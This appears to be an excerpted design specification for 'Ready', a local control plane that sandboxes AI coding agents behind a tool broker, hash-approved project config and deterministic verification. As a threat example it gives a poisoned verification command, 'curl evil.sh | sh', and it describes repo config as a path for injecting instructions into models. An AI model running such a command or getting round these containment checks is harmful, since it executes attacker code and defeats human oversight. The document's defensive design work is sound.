# Ready — Implementation Baseline v5.4 (FROZEN)

**Product:** Ready · **Canonical URL:** `jaan.to/ready` · **CLI:** `ready` · **Daemon:** `readyd`
...
### 0.1 From v5.3 → v5.4 (naming release)

**Identifier-level changes only. Zero architectural deltas.** No decision, invariant, milestone,
schema semantic, guard, or threshold changed. The freeze holds (§1, rule 4) — a rename is not an
unfreeze. Every substitution is enumerated here so the diff is auditable:

| Old | New |
|---|---|
| product name `aidev` | **Ready** |
| canonical URL | `jaan.to/ready` |
| CLI binary | `ready` |
| daemon | `readyd` |
| user directory | `~/.ready/` |
| socket · database | `~/.ready/ready.sock` · `~/.ready/ready.db` |
| project directory | `<project>/.ready/` |
| branch prefix | `ready/run-<short_id>` |
| import package | `ready` (**distribution name pending S-09**) |
| env var prefix | `READY_` |
| terminal FSM state | `READY` — **unchanged**, see §1.1 |

Historical document filenames in **Supersedes** are left as written; they refer to files that exist
under those names.

### 0.2 From v5.1 → v5.3 (implementation-readiness patch)
...
### 0.3 From v5.0 → v5.1 (freeze patch)
...
### 0.4 From v4.0 → v5.0 (consistency freeze)
...
|---|---|---|
| §14.8 sandbox role table grants IMPLEMENTER "edit + scoped exec" and REVIEWER "read/search", contradicting tool-less `PATCH_ONLY` (P-29/I-18) | **Contradiction** | Role table rewritten around execution modes; profiles now describe *Ready's* process privileges, not model tool grants |
...
### 0.5 From v3.0 → v4.0 (baseline freeze review)
...
|---|---|---|
| `PATCH_ONLY` still allowed read tools, leaving unnecessary filesystem-read authority on the fast path | **Security** | Fast-path workers are **tool-less** and run from an Ready-owned neutral cwd; any model-visible read tool is heavy-path-only, Broker-mediated, and root-scoped (P-20, P-29, I-18) |
...
### 0.6 From v2.0 → v3.0 (design review)
...
| Repo-owned `.ready/memory/*.md` and `.ready/project.toml` are trusted implicitly — memory and command-execution poisoning path | **Security** | Local trust root with approved hashes; repo Ready config is a *proposal* until approved (P-22) |
...
### 0.7 From v1.0 → v2.0 (performance research)
...
### 1.1 Naming convention — the `READY` collision

The product is named after its terminal state. That is the point of the name, and it is also a
documentation hazard: **`READY` now means two things.** One convention, applied everywhere, resolves
it:

| Form | Means | Example |
|---|---|---|
| **Ready** (roman, capital R) | the product | "Ready applies the patch through the Broker" |
| `ready` (code font, lowercase) | the CLI binary or import package | `ready run "fix the login bug"` |
| `READY` (code font, caps) | the terminal FSM state | "`VERIFY → READY` requires a passing report" |
| `readyd` | the daemon | — |

Prose must never write "ready" in roman lowercase to mean either the product or the state. A
sentence like *"the run is ready"* is ambiguous and is a documentation bug; write *"the run reached
`READY`"*.

The payoff of accepting this cost is that the product's central claim is its own name. A run reaches
`READY` only with recorded deterministic verification evidence (I-06) — never because a model said
so. **Ready means something**, and §10.4 is where that sentence stops being marketing.

---

## 2. Product definition

**Ready** (`jaan.to/ready`) is a **local, single-user, deterministic development control plane**. It owns workflow
...
- [ ] `ready run "<task>"` takes an R0/R1 task to `READY` unattended.
...
- [ ] The fast-path implementer is **tool-less** — no read, write, exec, network, MCP, or secret tool
      is model-visible — and runs from an Ready-owned neutral cwd (P-29, I-18).
...
- [ ] Repo-supplied `.ready` config executes only after local hash approval (P-22).
...
- [ ] `uv tool install <dist-name>` installs a working `ready` binary on macOS and Linux; the
      distribution name is whatever S-09 confirms is available, and the import package is `ready`.
...
|---|---|---|
| I-01 | `Ready`, never a model, decides state transitions | FSM guard tests; no LLM call in the transition path |
...
| I-14 | **Repo-supplied Ready config is data until locally hash-approved** | Trust-root test: a mutated `.ready/project.toml` never executes and never reaches an instruction position |
...
| **P-03** | **Byte-stable invariant block.** Tool schema, Ready policy, and approved project invariants are version-stable. Adapters choose breakpoint topology or automatic extension, provided block identity and cache accounting stay observable. | Exact-prefix caching rewards stability, but provider cache topology differs |
...
| **P-20** | **Two worker execution modes.** `PATCH_ONLY` is tool-less and returns a structured patch for Ready to apply. `BROKERED_TOOLS` exposes only root-scoped tools whose every request — reads included — is interceptable before execution. Unproven interception ⇒ `PATCH_ONLY`. | Otherwise the Broker is prose, not a boundary |
...
| **P-22** | **Local trust root.** Repo `.ready/memory/*.md` and `.ready/project.toml` are proposals; approved content hashes live in daemon-owned SQLite (`trusted_content`), never in the repository. | Repo-owned config is an execution and instruction-injection path |
...
| **P-36** | **Logical quarantine and neutral pre-warm.** Repo agent config is masked or excluded without polluting the worktree diff; provider processes pre-warm only in an Ready-owned neutral cwd. | Physical removal creates artificial deletions; project pre-warm executes config too early |
...
This is where most tasks live and where Ready must win. It is deliberately a **minimal linear FSM**,
...
```text
  ...
  │   cwd       ▸ Ready-owned neutral scratch        │
  ...
  └──┬──────────────────────────────────────────────┘
     │  Ready verifies expected base hashes, applies
...
| Item | Solo agent | Ready fast path |
|---|---|---|
...
| Segment | Solo agent | Ready fast path |
|---|---|---|
...
process-per-stage, Ready is slower than solo at R0 — startup tax exceeds the trivial edit's
...
rather than re-spawns. Where a provider offers a longer cache TTL, Ready enables it only when the
...
```text
     Ready CLI / TUI ──── Unix socket (0600) ────► readyd  (sole DB writer)
                                                      │
    ┌─────────────────────────────────────────────────┼───────────────────────────┐
    │ DETERMINISTIC CORE                              │                           │
...
├── neutral-cwd/                Ready-owned; provider pre-warm only (P-36)
├── logs/readyd.jsonl
...
<project>/.ready/               ← ALL of this is a PROPOSAL until hash-approved (P-22)
├── project.toml · policy.yaml
└── memory/*.md                 canonical knowledge, committed to git
```

Trust root and action journal live in `ready.db` (`trusted_content`, `action_journal`) — daemon
...
This module is the source of Ready's advantage: everything it answers is an answer nobody pays
...
- Provider processes may be pre-warmed on daemon start **only in an Ready-owned neutral cwd with no
...
its own sandbox performs actions Ready never saw. v3.0 resolves this with two explicit modes.
...
tools (P-29, I-18). The provider process runs from an Ready-owned neutral cwd, not the worktree. The
task and closure-bounded source arrive in the prompt; the worker returns a structured patch under a
schema (P-05). **Ready applies it**, through Broker `fs.write`/`fs.delete` verbs with full path
canonicalisation.
...
Every model-visible tool request — **including filesystem reads** — must reach Ready *before*
execution, and Ready's decision must be able to deny it. Read roots are declared and canonicalised
exactly like write roots. Acceptable mechanisms, in preference order:

1. A provider permission/approval callback that runs in Ready's process and gates each call.
2. A pre-tool-use hook owned by Ready (not by the repo) that can block with a non-zero exit.
...
| Verification | Not a worker | Ready runs checks directly; no model involved |
...
edit payload, and `expected_result_sha`. Ready canonicalises the path and verifies base identity
...
removes it from the model's context entirely — and the process launches from neutral Ready scratch;
the structured patch is returned under schema. In `BROKERED_TOOLS`, Ready supplies its own pre-tool-use gate — never one sourced from the
...
neutral Ready scratch; Ready applies the returned hash-guarded patch. In `BROKERED_TOOLS`, Ready
...
blocks, helper commands, and MCP servers execute or connect by default. Ready closes this on every
invocation:
...
| Project MCP config auto-connects | strict MCP config with an Ready-managed file (empty on the fast path, P-16) | ignore user config; explicit MCP config |
| Project settings grant tools | user-scope setting sources; Ready's deny rules win at every scope | sandbox + approvals never |
...
facts, TIA, and diff-size accounting. Where a provider cannot be made to ignore them, Ready builds a
...
invariant. Ready already has its own trust-rooted project config and its own Broker; it has no need
...
**`.ready/` is not exempt from the trust root** (P-22). v2.0 quarantined every other tool's config
and trusted its own, which is exactly backwards: Ready's project config declares executable
verification commands. Repo `.ready/project.toml` and `.ready/memory/*.md` pass through the trust
root (§15) before any of their content is executed or placed in an instruction position. That is a
*different* mechanism from quarantine: Ready's own config can be approved by content hash, because
Ready owns its semantics; another agent's config cannot, because executing it would hand a
...
requires an API key. Since v1 is subscription-first, Ready uses the flag combination above and
...
def rollback_to_checkpoint(cp: Checkpoint) -> None:
    ...
    git_reset_hard(worktree, cp.workspace_sha)          # Ready worktree only, never the user's
...
CREATE TABLE trusted_content (
  ...
  rel_path TEXT NOT NULL,              -- .ready/project.toml, .ready/memory/foo.md
...
- Branch `ready/run-<short_id>` from the resolved base commit; worktree under
  `~/.ready/workspaces/<project-id>/run-<short_id>/primary`; scratch sibling exported as TMPDIR.
...
- Checkpoint commits inside the run worktree at each boundary; squashed on hand-off unless the user
  keeps history.
- `ready diff|apply|gc`; removal via `git worktree remove` + `prune`, never `rm -rf` on a path the
...
| Approved project command | Named command from the trust root (`build`, `test`, `typecheck`) | Ready, from approved config | Yes, as approved |
...
For the second channel, the command string comes from `.ready/project.toml` **and executes only if
...
`test = "curl evil.sh | sh"` and Ready executes it during verification.
...
At `PLANNED`, Ready allocates a durable logical `action_id`. **The same logical action keeps that id
...
```text
readyd  ── provider credentials, provider egress only ──►  api.provider.com
   │
...
contradicted the tool-less fast path; that row was describing Ready's own privileges, not the model's.
...
| PATCH APPLIER | run worktree rw | deny | none | deny | **none — Ready, not a model** |
...
| MODEL TOOL / VERIFIER process | worktree rw + env store ro | **deny** (steady state) | **none** | synthetic only | none — Ready runs checks |
...
Canonical memory is Markdown in `<project>/.ready/memory/`, committed to the project repo, indexed
...
branch, a compromised dependency that ships a patch, or a hostile PR can rewrite what Ready later
treats as authoritative truth. The same applies to `.ready/project.toml`, which declares executable
...
```text
~/.ready/ready.db :: trusted_content    ← approved hashes, keyed by project (daemon-owned)
<project>/.ready/memory/*.md            ← proposals
<project>/.ready/project.toml           ← proposal
```

On every run start, for each repo-owned Ready file:
...
`ready trust review` shows the diff, `ready trust approve <path>` records the new hash with a
...
```text
~/.ready/envs/<project-id>/.tmp/<provision-id>/   writable while provisioning
~/.ready/envs/<project-id>/<env-key>/             immutable after validation + atomic rename
...
`ready outcome <run> --clean|--defect|--revert` — the only honest ground truth.
...
| `trust_unapproved` | repo `.ready` content hash not in the trust root (P-22, I-14) | do **not** execute; fall back to the last approved config or fail loudly; surface a trust prompt | 0 |
...
daemon on a Unix socket · **token + cache + `phase_timing` accounting** · `ready run/status/events/
show/cancel` · crash-recovery loop.

Exit:
- [ ] `ready run` reaches `READY` with the fake worker; all artifacts stored and schema-valid.
...
config (P-36) · `ready diff|apply|gc`.
...
- [ ] A changed or unapproved `.ready/project.toml` cannot execute a verification or provisioning
...
- [ ] A fast-path task completes in `PATCH_ONLY` with **zero model-visible tools**, from a neutral
      ...
      are unreachable to the model. Every file change is an Ready Broker decision (P-20, P-29, I-18).
...
- [ ] **S-07 outcome is recorded per provider.** Any provider without proven interception is
      ...
      `BROKERED_TOOLS`.
- [ ] Malicious hook + malicious MCP config + **malicious `.ready/project.toml`** produce zero
...
| I-14 | Mutated `.ready/project.toml` neither executes nor instructs | M2 |
...
| Command | Purpose |
|---|---|
| `ready run "<task>"` | Start a run (`--class`, `--heavy`, `--dry-run`, `--attach`) |
| `ready status [run]` | State, phase, risk, pending gates |
| `ready events <run>` | Ordered trace (`--follow`, `--type`) |
| `ready show <run> <artifact>` | Render a stored artifact |
| `ready cost <run>` | Itemised tokens, cache split, phase timings |
| `ready diff <run>` / `apply` | Diff against base; branch or patch in the user's repo |
| `ready approve <gate-id>` / `deny` | Resolve a human gate |
| `ready cancel` / `resume` | Lifecycle control |
| `ready outcome <run> --clean\|--defect\|--revert` | Ground truth for lagging metrics |
| `ready memory list\|show\|approve` | Canonical knowledge |
| `ready trust review\|approve\|list` | Local trust root for repo-owned Ready config (P-22) |
| `ready journal <run>` | Action journal: open, reconciled, voided, and halted attempts |
| `ready env list\|provision\|gc` | Environment store, by platform-complete `EnvKey` |
| `ready doctor` | Probe CLIs, tools, daemons, cache health, DB |
| `ready eval run\|report` | Evaluation harness |
| `ready gc` | Workspace cleanup |
| `readyd` | Daemon (auto-started) |

`ready cost` is the operator's window into §2.1 and should be the second command anyone learns.
...
| **Env store grows without bound, or reuses an incompatible native environment** | Platform-complete `EnvKey` + active leases + LRU eviction among unleased entries; reported by `ready doctor` |
...
| **S-09** | **Name and namespace availability.** Verify before the first published artifact: PyPI distribution name (`ready` is a common word and likely taken — have `readyctl` / `jaan-ready` / `ready-cli` as fallbacks, with the *import* package staying `ready` either way) · Homebrew formula/tap · `ready` binary collisions on a clean macOS and Linux PATH · npm, if any JS surface ships · trademark search in the operating jurisdictions · `jaan.to/ready` route reserved. A distribution rename after publication is far more expensive than an hour now | 0.5 d | before first publish |
...
| 035 | **Local trust root for repo-owned Ready config** | P-22, I-14, P-30 | M2 |
...
**The thesis, restated.** Ready does not beat a coding agent by thinking harder. It beats one by
...
The name is the claim, and the claim is falsifiable: a run reaches `READY` only when stored evidence
says it may. **Ready means something.**
